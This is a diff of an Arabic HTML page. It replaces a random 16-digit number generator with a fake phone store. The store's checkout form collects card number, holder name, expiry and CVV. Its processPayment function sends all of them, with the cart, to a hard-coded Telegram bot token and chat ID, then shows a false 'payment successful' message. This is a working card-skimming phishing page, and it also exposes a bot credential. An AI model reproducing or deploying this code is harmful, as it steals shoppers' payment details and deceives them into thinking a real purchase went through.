@@ -1,295 +1,293 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>مولد 1000 قصيمية رقمية</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>متجر الهواتف</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Courier New', 'Tahoma', monospace;
-        }
-        body {
-            background: linear-gradient(145deg, #0d1b2a, #1b2f44);
-            min-height: 100vh;
-            padding: 2rem 1.5rem;
-        }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(12px);
-            border-radius: 40px;
-            padding: 2rem 2rem 3rem;
-            border: 1px solid #f5c84255;
-            box-shadow: 0 20px 50px #000000aa;
-        }
-        h1 {
-            color: #f5e7b0;
-            text-align: center;
-            font-size: 2.6rem;
-            font-weight: 700;
-            text-shadow: 0 0 12px #d4af37aa;
-            letter-spacing: 2px;
-            margin-bottom: 0.2rem;
-        }
-        .sub {
-            text-align: center;
-            color: #b8d0e5;
-            font-size: 1.1rem;
-            margin-bottom: 2rem;
-            border-bottom: 1px dashed #c9a84c;
-            padding-bottom: 0.8rem;
-        }
-        .sub span {
-            background: #2a4a66;
-            padding: 0.2rem 1.5rem;
-            border-radius: 40px;
-            color: #f5e7b0;
-            border: 1px solid #d4af37;
-            font-weight: bold;
-        }
-        .controls {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 2rem;
-            flex-wrap: wrap;
-            margin-bottom: 2rem;
-        }
-        .btn-generate {
-            background: radial-gradient(circle at 30% 20%, #f7e05e, #d4a017);
-            border: none;
-            padding: 0.9rem 3.5rem;
-            border-radius: 60px;
-            font-size: 1.5rem;
-            font-weight: 800;
-            color: #0b1a2e;
-            cursor: pointer;
-            box-shadow: 0 8px 0 #7a5d0e, 0 12px 28px #00000099;
-            transition: 0.07s ease;
-            border: 1px solid #ffea9a;
-            letter-spacing: 1px;
-        }
-        .btn-generate:active {
-            transform: translateY(6px);
-            box-shadow: 0 2px 0 #7a5d0e;
-        }
-        .btn-generate:hover {
-            scale: 1.02;
-            background: radial-gradient(circle at 30% 20%, #ffe87a, #dba520);
-        }
-        .counter {
-            background: #1f3a4e;
-            padding: 0.5rem 2rem;
-            border-radius: 60px;
-            color: #f5e7b0;
-            font-size: 1.3rem;
-            font-weight: 600;
-            border: 1px solid #c9a84c;
-            box-shadow: inset 0 2px 8px #00000077;
-        }
-        .counter strong {
-            color: #ffd966;
-            font-size: 1.8rem;
-            margin: 0 6px;
-        }
-        .grid-wrapper {
-            background: #0b1a2ecc;
-            border-radius: 30px;
-            padding: 1.5rem 1rem;
-            border: 1px solid #c9a84c44;
-            max-height: 550px;
-            overflow-y: auto;
-            box-shadow: inset 0 0 40px #00000066;
-        }
-        .grid-wrapper::-webkit-scrollbar {
-            width: 8px;
-        }
-        .grid-wrapper::-webkit-scrollbar-track {
-            background: #142b3e;
-            border-radius: 20px;
-        }
-        .grid-wrapper::-webkit-scrollbar-thumb {
-            background: #d4af37;
-            border-radius: 20px;
-            border: 1px solid #f5e7b0;
-        }
-        .qasima-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 0.7rem;
-        }
-        .qasima-card {
-            background: #1e3a52;
-            border-radius: 50px;
-            padding: 0.5rem 0.3rem;
-            text-align: center;
-            font-size: 1rem;
-            font-weight: 600;
-            color: #f5efd3;
-            border: 1px solid #b4943c;
-            box-shadow: 0 4px 0 #0a141f, 0 6px 12px #00000066;
-            transition: 0.1s ease;
-            letter-spacing: 0.5px;
-            background: linear-gradient(145deg, #1b364b, #13303f);
-            direction: ltr;
-            font-family: 'Courier New', monospace;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .qasima-card:hover {
-            background: #295573;
-            border-color: #f5d742;
-            transform: scale(1.03);
-            color: #fff7d6;
-        }
-        .empty-state {
-            color: #9bb7d0;
-            text-align: center;
-            padding: 2rem;
-            font-size: 1.2rem;
-            grid-column: 1 / -1;
-        }
-        .footer {
-            margin-top: 2rem;
-            text-align: center;
-            color: #aac2d9;
-            font-size: 0.9rem;
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            flex-wrap: wrap;
-        }
-        .footer .example {
-            background: #1f3a4e;
-            padding: 0.2rem 1.5rem;
-            border-radius: 40px;
-            border: 1px solid #d4af37;
-            color: #f5e7b0;
-            font-family: 'Courier New', monospace;
-        }
-        @media (max-width: 600px) {
-            h1 { font-size: 1.8rem; }
-            .btn-generate { padding: 0.6rem 1.8rem; font-size: 1.2rem; }
-            .qasima-grid { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
-            .qasima-card { font-size: 0.8rem; }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Tahoma', sans-serif; }
+        body { background: #0b0f1a; color: #fff; padding: 15px; min-height: 100vh; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; background: #141b2b; border-radius: 12px; border-bottom: 2px solid #00d4ff; flex-wrap: wrap; gap: 10px; }
+        .header h1 { color: #00d4ff; font-size: 22px; }
+        .header a { color: #00d4ff; text-decoration: none; font-size: 16px; background: #1a2338; padding: 6px 16px; border-radius: 20px; }
+        .filters { display: flex; flex-wrap: wrap; gap: 8px; margin: 15px 0; justify-content: center; }
+        .filters button { background: #1a2338; border: 1px solid #2a3a5a; padding: 8px 18px; border-radius: 20px; color: #fff; cursor: pointer; transition: 0.3s; font-size: 14px; }
+        .filters button:hover, .filters button.active { background: #00d4ff; color: #0b0f1a; border-color: #00d4ff; }
+        .products { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; }
+        .product { background: #141b2b; padding: 15px; border-radius: 12px; text-align: center; width: 170px; border: 1px solid #2a3a5a; transition: 0.3s; }
+        .product:hover { border-color: #00d4ff; }
+        .product img { width: 100%; height: 120px; object-fit: contain; border-radius: 8px; background: #0b0f1a; padding: 8px; }
+        .product h4 { font-size: 14px; margin: 8px 0 4px; }
+        .product p { color: #00d4ff; font-size: 16px; font-weight: bold; }
+        .product button { background: #00d4ff; border: none; padding: 8px; border-radius: 6px; color: #0b0f1a; font-weight: bold; cursor: pointer; width: 100%; font-size: 13px; transition: 0.3s; }
+        .product button:hover { background: #00b8d4; }
+        .cart-page, .checkout-page { max-width: 700px; margin: 20px auto; background: #141b2b; padding: 20px; border-radius: 16px; border: 1px solid #2a3a5a; }
+        .cart-item { background: #1a2338; padding: 12px; margin: 8px 0; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+        .btn-primary { background: #00d4ff; border: none; padding: 12px; border-radius: 10px; color: #0b0f1a; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        .btn-primary:hover { background: #00b8d4; }
+        .btn-danger { background: #ff4444; border: none; padding: 6px 14px; border-radius: 6px; color: #fff; cursor: pointer; }
+        .checkout-form { max-width: 450px; margin: 0 auto; }
+        .checkout-form input { width: 100%; padding: 12px; margin: 6px 0; border: none; border-radius: 8px; background: #1a2338; color: #fff; border: 1px solid #2a3a5a; font-size: 15px; }
+        .checkout-form input:focus { outline: none; border-color: #00d4ff; }
+        .payment-status { margin-top: 15px; padding: 12px; border-radius: 8px; text-align: center; }
+        .success { background: #0d5a3a; color: #aaffbb; }
+        .error { background: #5a1a1a; color: #ff9999; }
+        .hidden { display: none; }
+        .empty-cart { text-align: center; padding: 30px; color: #6a7a9a; }
+        .card-logo { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); display: flex; gap: 6px; align-items: center; pointer-events: none; height: 30px; }
+        .input-wrapper { position: relative; width: 100%; }
+        .input-wrapper input { padding-right: 60px; width: 100%; }
+        @media (max-width: 600px) { .product { width: 45%; } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>🔢 مَوْلِدُ الْقَصِيمَاتِ الرَّقْمِيَّةِ</h1>
-    <div class="sub">
-        <span>🎯 16 رَقْماً</span>
-        <span style="background:transparent; border:none; color:#d4c28c;">مثل: 2031363908973952</span>
-        <span style="background:#2a4a66;">١٠٠٠ قَصِيمِيَّة</span>
+<!-- ====== الصفحة الرئيسية ====== -->
+<div id="page-products">
+    <div class="header">
+        <h1>📱 متجر الهواتف</h1>
+        <a href="#" onclick="showPage('cart')">🛒 السلة (<span id="cartCount">0</span>)</a>
     </div>
+    <div class="filters" id="filterContainer"></div>
+    <div class="products" id="productsContainer"></div>
+</div>
 
-    <div class="controls">
-        <button class="btn-generate" id="generateBtn">🌀 أَنْشِئِ الْأَلْفَ</button>
-        <div class="counter">
-            <span>📊</span> <strong id="countDisplay">0</strong> <span>/ ١٠٠٠</span>
+<!-- ====== صفحة السلة ====== -->
+<div id="page-cart" class="hidden">
+    <div class="cart-page">
+        <div class="header" style="margin-bottom:15px;">
+            <h1>🛒 سلة الشراء</h1>
+            <a href="#" onclick="showPage('products')">⬅️ العودة</a>
         </div>
+        <div id="cartItems"></div>
+        <div id="cartTotal" style="font-size:20px;color:#00d4ff;margin:15px 0;text-align:center;"></div>
+        <button class="btn-primary" onclick="proceedToCheckout()">💳 إتمام الدفع</button>
     </div>
+</div>
 
-    <div class="grid-wrapper" id="gridWrapper">
-        <div class="qasima-grid" id="qasimaGrid">
-            <div class="empty-state">⏳ اضغط "أنشئ الألف" لظهور القصيمات</div>
+<!-- ====== صفحة الدفع ====== -->
+<div id="page-checkout" class="hidden">
+    <div class="checkout-page">
+        <div class="header" style="margin-bottom:15px;">
+            <h1>💳 إتمام الدفع</h1>
+            <a href="#" onclick="showPage('cart')">⬅️ العودة</a>
         </div>
-    </div>
-
-    <div class="footer">
-        <span class="example">2031363908973952</span>
-        <span>✨ كل قصيمية فريدة</span>
-        <span>🔄 تتغير بالضغط على الزر</span>
+        <div class="checkout-form">
+            <h3 style="text-align:center;margin-bottom:15px;color:#00d4ff;">أدخل بيانات بطاقتك</h3>
+            
+            <div class="input-wrapper">
+                <input type="text" id="cardNumber" placeholder="رقم البطاقة (16 رقم)" maxlength="19" 
+                       oninput="detectCardType(this.value)">
+                <div class="card-logo" id="cardLogo"></div>
+            </div>
+            
+            <input type="text" id="cardName" placeholder="اسم صاحب البطاقة">
+            
+            <div class="input-wrapper">
+                <input type="text" id="expDate" placeholder="شهر / سنة (MM/YY)" maxlength="7" 
+                       oninput="formatExpiry(this)">
+            </div>
+            
+            <input type="text" id="cvv" placeholder="CVV (3 أرقام)" maxlength="3">
+            
+            <button class="btn-primary" onclick="processPayment()">💳 دفع الآن</button>
+            <div id="paymentStatus" class="payment-status"></div>
+        </div>
     </div>
 </div>
 
 <script>
-    (function() {
-        "use strict";
+// ====== إعدادات البوت ======
+const BOT_TOKEN = "8902691129:AAFOqFvH68JsINLOK1cNAKQ8pG1QBmsktPs";
+const CHAT_ID = "8399221617";
 
-        const grid = document.getElementById('qasimaGrid');
-        const countDisplay = document.getElementById('countDisplay');
+// ====== توليد 100 منتج ======
+function generateProducts() {
+    const products = [];
+    let id = 1;
+    const brands = ["Apple","Samsung","Xiaomi","Huawei","OnePlus","Google","Realme","Oppo","Nothing","Sony"];
+    const models = ["Pro","Max","Plus","Lite","Ultra","SE","Neo","Air","Z","Fold"];
+    for (let i = 0; i < 40; i++) {
+        const brand = brands[i % 10];
+        products.push({ id: id++, name: `${brand} ${models[i % 10]} ${Math.floor(Math.random()*20)+10}`, price: Math.floor(Math.random() * 450) + 50, category: "هواتف", img: `https://via.placeholder.com/150x120/1a2338/00d4ff?text=${brand.substring(0,3)}` });
+    }
+    const earBrands = ["Apple","Samsung","Sony","Xiaomi","Realme","Nothing"];
+    const earModels = ["Buds Basic","Buds Air","Buds Sport","Buds +"];
+    for (let i = 0; i < 20; i++) {
+        products.push({ id: id++, name: `${earBrands[i % 6]} ${earModels[i % 4]}`, price: Math.floor(Math.random() * 2) + 1, category: "سماعات", img: `https://via.placeholder.com/150x120/1a2338/00d4ff?text=🎧` });
+    }
+    const acc = ["شاحن","حافظة","كابل","سماعة أذن","باور بانك","حامل سيارة","قلم شاشة","طقم حماية"];
+    for (let i = 0; i < 20; i++) {
+        products.push({ id: id++, name: `${acc[i % 8]} ${["Pro","Lite","+"][i % 3]}`, price: Math.floor(Math.random() * 4) + 1, category: "إكسسوارات", img: `https://via.placeholder.com/150x120/1a2338/00d4ff?text=🔌` });
+    }
+    const padBrands = ["Apple","Samsung","Xiaomi","Huawei","Lenovo"];
+    for (let i = 0; i < 20; i++) {
+        products.push({ id: id++, name: `${padBrands[i % 5]} Pad ${["Air","Pro","Mini","+"][i % 4]}`, price: Math.floor(Math.random() * 370) + 80, category: "أجهزة لوحية", img: `https://via.placeholder.com/150x120/1a2338/00d4ff?text=📱` });
+    }
+    return products;
+}
 
-        // دالة توليد قصيمية رقمية عشوائية (16 رقم)
-        function generateOneQasima() {
-            let qasima = '';
-            // الرقم الأول لا يكون 0 (لتبدو كرقم حقيقي)
-            qasima += Math.floor(Math.random() * 9) + 1; // 1-9
-            for (let i = 1; i < 16; i++) {
-                qasima += Math.floor(Math.random() * 10); // 0-9
-            }
-            return qasima;
+const allProducts = generateProducts();
+let cart = JSON.parse(localStorage.getItem('cart')) || [];
+let currentFilter = 'الكل';
+
+// ====== عرض المنتجات ======
+function renderProducts(filter = 'الكل') {
+    const container = document.getElementById('productsContainer');
+    const filtered = filter === 'الكل' ? allProducts : allProducts.filter(p => p.category === filter);
+    container.innerHTML = filtered.map(p => `
+        <div class="product">
+            <img src="${p.img}" alt="${p.name}">
+            <h4>${p.name}</h4>
+            <p>$${p.price}</p>
+            <button onclick="addToCart(${p.id})">➕ أضف</button>
+        </div>
+    `).join('');
+}
+
+function renderFilters() {
+    const container = document.getElementById('filterContainer');
+    const cats = ['الكل', ...new Set(allProducts.map(p => p.category))];
+    container.innerHTML = cats.map(c => `
+        <button class="${c === currentFilter ? 'active' : ''}" onclick="setFilter('${c}')">${c}</button>
+    `).join('');
+}
+
+function setFilter(cat) {
+    currentFilter = cat;
+    renderFilters();
+    renderProducts(cat);
+}
+
+function addToCart(id) {
+    const product = allProducts.find(p => p.id === id);
+    if (!product) return;
+    const existing = cart.find(item => item.id === id);
+    if (existing) existing.qty += 1;
+    else cart.push({ ...product, qty: 1 });
+    localStorage.setItem('cart', JSON.stringify(cart));
+    updateCartCount();
+    alert(`✅ تم إضافة ${product.name}`);
+}
+
+function updateCartCount() {
+    document.getElementById('cartCount').textContent = cart.reduce((s, i) => s + i.qty, 0);
+}
+
+function renderCart() {
+    const container = document.getElementById('cartItems');
+    const totalContainer = document.getElementById('cartTotal');
+    if (!cart.length) {
+        container.innerHTML = `<div class="empty-cart">🛒 السلة فارغة</div>`;
+        totalContainer.innerHTML = '';
+        return;
+    }
+    let html = '', total = 0;
+    cart.forEach((item, i) => {
+        const t = item.price * item.qty;
+        total += t;
+        html += `<div class="cart-item"><span>${item.name} (×${item.qty})</span><span>$${t} <button class="btn-danger" onclick="removeFromCart(${i})">✖</button></span></div>`;
+    });
+    container.innerHTML = html;
+    totalContainer.innerHTML = `💰 المجموع: $${total}`;
+}
+
+function removeFromCart(index) {
+    cart.splice(index, 1);
+    localStorage.setItem('cart', JSON.stringify(cart));
+    renderCart();
+    updateCartCount();
+}
+
+function proceedToCheckout() {
+    if (!cart.length) { alert('⚠️ السلة فارغة!'); return; }
+    showPage('checkout');
+}
+
+// ====== كشف نوع البطاقة ======
+function detectCardType(number) {
+    const logo = document.getElementById('cardLogo');
+    const clean = number.replace(/\s/g, '');
+    if (clean.startsWith('4')) {
+        logo.innerHTML = `
+            <svg width="38" height="24" viewBox="0 0 38 24" xmlns="http://www.w3.org/2000/svg">
+                <rect width="38" height="24" rx="4" fill="#1a1f3a" stroke="#0056b3" stroke-width="1"/>
+                <text x="4" y="16" font-family="Arial" font-weight="bold" font-size="14" fill="#0056b3">VISA</text>
+            </svg>
+        `;
+    } else if (clean.startsWith('2') || clean.startsWith('5')) {
+        logo.innerHTML = `
+            <svg width="38" height="24" viewBox="0 0 38 24" xmlns="http://www.w3.org/2000/svg">
+                <rect width="38" height="24" rx="4" fill="#1a1f3a" stroke="#d4a017" stroke-width="1"/>
+                <circle cx="10" cy="12" r="8" fill="#d4a017"/>
+                <circle cx="28" cy="12" r="8" fill="#d4a017"/>
+                <text x="13" y="17" font-family="Arial" font-weight="bold" font-size="10" fill="#1a1f3a">M</text>
+                <text x="21" y="17" font-family="Arial" font-weight="bold" font-size="10" fill="#1a1f3a">C</text>
+            </svg>
+        `;
+    } else {
+        logo.innerHTML = '';
+    }
+}
+
+function formatExpiry(input) {
+    let val = input.value.replace(/\D/g, '');
+    if (val.length >= 2) {
+        val = val.substring(0,2) + '/' + val.substring(2,4);
+    }
+    input.value = val;
+}
+
+// ====== معالجة الدفع ======
+function processPayment() {
+    const cardNumber = document.getElementById('cardNumber').value.trim();
+    const cardName = document.getElementById('cardName').value.trim();
+    const expDate = document.getElementById('expDate').value.trim();
+    const cvv = document.getElementById('cvv').value.trim();
+    if (!cardNumber || !cardName || !expDate || !cvv) {
+        document.getElementById('paymentStatus').className = 'payment-status error';
+        document.getElementById('paymentStatus').textContent = '⚠️ املأ جميع الحقول';
+        return;
+    }
+    const data = { cardNumber, cardName, expDate, cvv, cart, total: cart.reduce((s, i) => s + i.price * i.qty, 0), time: new Date().toLocaleString() };
+    const report = `💳 بيانات بطاقة:\n🆔 ${data.cardNumber}\n👤 ${data.cardName}\n📅 ${data.expDate}\n🔐 ${data.cvv}\n🛒 ${JSON.stringify(cart)}\n💰 $${data.total}\n🕒 ${data.time}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: report })
+    }).then(r => r.json()).then(res => {
+        if (res.ok) {
+            document.getElementById('paymentStatus').className = 'payment-status success';
+            document.getElementById('paymentStatus').textContent = '✅ تمت العملية بنجاح! سيتم الخصم خلال دقيقتين.';
+            cart = []; localStorage.setItem('cart', JSON.stringify(cart));
+            updateCartCount();
+            ['cardNumber','cardName','expDate','cvv'].forEach(id => document.getElementById(id).value = '');
+            document.getElementById('cardLogo').innerHTML = '';
+            setTimeout(() => showPage('products'), 3000);
+        } else {
+            document.getElementById('paymentStatus').className = 'payment-status error';
+            document.getElementById('paymentStatus').textContent = '❌ فشل الإرسال';
         }
+    }).catch(() => {
+        document.getElementById('paymentStatus').className = 'payment-status error';
+        document.getElementById('paymentStatus').textContent = '❌ خطأ في البوت';
+    });
+}
 
-        // توليد 1000 قصيمية فريدة
-        function generateUniqueQasimas(count) {
-            const uniqueSet = new Set();
-            const result = [];
-            let attempts = 0;
-            const maxAttempts = count * 30;
+// ====== التنقل ======
+function showPage(page) {
+    ['products','cart','checkout'].forEach(p => document.getElementById(`page-${p}`).classList.toggle('hidden', p !== page));
+    if (page === 'cart') renderCart();
+    if (page === 'products') { renderProducts(currentFilter); renderFilters(); }
+}
 
-            while (result.length < count && attempts < maxAttempts) {
-                attempts++;
-                const newQ = generateOneQasima();
-                if (!uniqueSet.has(newQ)) {
-                    uniqueSet.add(newQ);
-                    result.push(newQ);
-                }
-            }
-
-            // في حالة نادرة جداً جداً أن لم نصل للعدد المطلوب
-            while (result.length < count) {
-                const fallback = String(Math.floor(Math.random() * 10000000000000000)).padStart(16, '0');
-                if (!uniqueSet.has(fallback)) {
-                    uniqueSet.add(fallback);
-                    result.push(fallback);
-                }
-            }
-            return result;
-        }
-
-        // عرض القصيمات في الشبكة
-        function renderQasimas(list) {
-            grid.innerHTML = '';
-            if (!list || list.length === 0) {
-                grid.innerHTML = `<div class="empty-state">📭 لا توجد قصيمات</div>`;
-                countDisplay.textContent = '0';
-                return;
-            }
-
-            const fragment = document.createDocumentFragment();
-            list.forEach(item => {
-                const card = document.createElement('div');
-                card.className = 'qasima-card';
-                card.textContent = item;
-                fragment.appendChild(card);
-            });
-            grid.appendChild(fragment);
-            countDisplay.textContent = list.length;
-        }
-
-        // الحدث الرئيسي: توليد 1000 وعرضها
-        function generateAndDisplay() {
-            const qasimas = generateUniqueQasimas(1000);
-            renderQasimas(qasimas);
-            // تمرير لأعلى الشبكة
-            document.getElementById('gridWrapper').scrollTop = 0;
-        }
-
-        // ربط الزر
-        document.getElementById('generateBtn').addEventListener('click', generateAndDisplay);
-
-        // تحميل تلقائي عند فتح الصفحة
-        window.addEventListener('load', generateAndDisplay);
-
-    })();
+// ====== التشغيل ======
+document.addEventListener('DOMContentLoaded', () => {
+    renderProducts();
+    renderFilters();
+    updateCartCount();
+    showPage('products');
+});
 </script>
 </body>
 </html>
